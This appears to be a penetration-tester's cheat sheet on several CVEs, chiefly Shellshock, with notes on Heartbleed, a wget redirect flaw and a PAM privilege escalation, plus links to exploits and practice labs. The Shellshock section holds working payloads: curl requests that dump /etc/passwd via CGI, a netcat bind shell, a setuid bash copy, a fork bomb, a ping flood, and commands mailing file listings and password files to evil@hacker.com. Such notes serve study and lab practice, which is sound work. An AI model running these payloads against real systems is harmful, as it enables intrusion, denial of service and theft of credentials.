## Exploits

### CVE-2014-6271 - Shellshock
- `Bash 4.3` and earlier
- Execute commands from `environment variables` unintentionally.
- Caused by Bash processing trailing strings after function definitions in the values of environment variables.
- Exploitable when attacker has control of environment variables.

```
GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1
User-Agent: Netsparker
Host: shellshock.testsparker.com
Referer: () { :;}; echo "NS:" $(</etc/passwd)
```

#### Test if Vulnerable
```
env x='() { :;}; echo OOPS' bash -c :
env x='() { :;}; echo vulnerable' bash -c "echo not-vulnerable"
```

#### Explanation
- To run a command in a new shell
```
bash -c ls
```
- New shell inherits environment
- If new shell finds what seems to be a function in an environment variable:
  - New shell executes the function to get the actual value
  - When function is executed, evaluation didn’t stop when the end of the function definition is reached.

Hence, when new shell sees `() { :;};`, bash will start executing the function and proceed to also execute the `echo`.

#### Samples

Passwd
```
curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status
```
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://192.168.1.14/cgi-bin/status
```
Directory Listing
```
curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls /' http://192.168.1.14/cgi-bin/status
```

Reverse shell
```
curl -A '() { :; }; /bin/bash -c "/usr/bin/nc -lvvp 2345 -e /bin/bash"' http://192.168.1.14/cgi-bin/status
```

Setuid shell
```
() { :; }; cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```

Fork Bomb
```
() { :; }; :(){ :|: & };:
```

Ping Bot
```
() { :; }; ping -s 1000000 <victim IP>
```

Data Theft
```
() { :; }; find ~ -print | mail -s "Your files" evil@hacker.com
() { :; }; cat ~/.secret/passwd | mail -s "This password file" evil@hacker.com
```

#### Exploitation Vectors
> - Ref: https://github.com/opsxcq/exploit-CVE-2014-6271

##### CGI
- Bash will receive the environment variables passed by the server
- Server passes various details of the request to a handler program in the environment variable list. For example, `HTTP_USER_AGENT`.
- `exploit/multi/http/apache_mod_cgi_bash_env_exec`
- [Apache mod_cgi - 'Shellshock' Remote Command Injection](https://www.exploit-db.com/exploits/34900)

##### OpenSSH
- ForceCommand will execute a fixed command on login
- If user specify a command to run, user specific command is put into environment (`SSH_ORIGINAL_COMMAND`)
- Bash will parse `SSH_ORIGINAL_COMMAND` on start-up, and run the commands

##### DHCP clients
- Some DHCP clients can also pass commands to Bash
- Malicious DHCP server provide, a string crafted to execute code (in an addition option)

##### Qmail server
- Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash.

##### IBM HMC restricted shell

#### References
- [Shellshock: How does it actually work?](https://fedoramagazine.org/shellshock-how-does-it-actually-work/)
- [[Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability](https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability)

#### Practice
- [https://pentesterlab.com/exercises/cve-2014-6271](https://pentesterlab.com/exercises/cve-2014-6271)
- [[Docker] Shellshock exploit + vulnerable environment](https://github.com/opsxcq/exploit-CVE-2014-6271)
- HTB - Shocker

### CVE-2014-7169

### CVE-2014-0160 - Heartbleed
Exploits:
- [https://github.com/sensepost/heartbleed-poc](https://github.com/sensepost/heartbleed-poc)

#### References
- https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/

### CVE-2016-4971 - GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution
- issuing a crafted HTTP 30X Redirect containing FTP server reference in response
- `wget` will automatically follow the redirect
- `wget` will download a malicious file from the FTP server (to current dir)
- `wget` will fail to rename the file to the originally requested filename
- will not work with `-O`
- However, By saving `.wgetrc` in `/home/victim/.wgetrc` could set arbitrary wget settings such as destination directory

Exploits:
- [https://www.exploit-db.com/exploits/40064](https://www.exploit-db.com/exploits/40064)


## Privilege Escalation

### CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering
- pam_motd (aka the MOTD module) in libpam-modules
- Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10
- Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS
- Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory.
- "user file stamps" and the `motd.legal-notice` file.

Exploits:
- [https://www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)
- [https://www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
- [https://twitter.com/jonoberheide/status/18009527979](https://twitter.com/jonoberheide/status/18009527979)

Practice:
- HTB - Popcorn
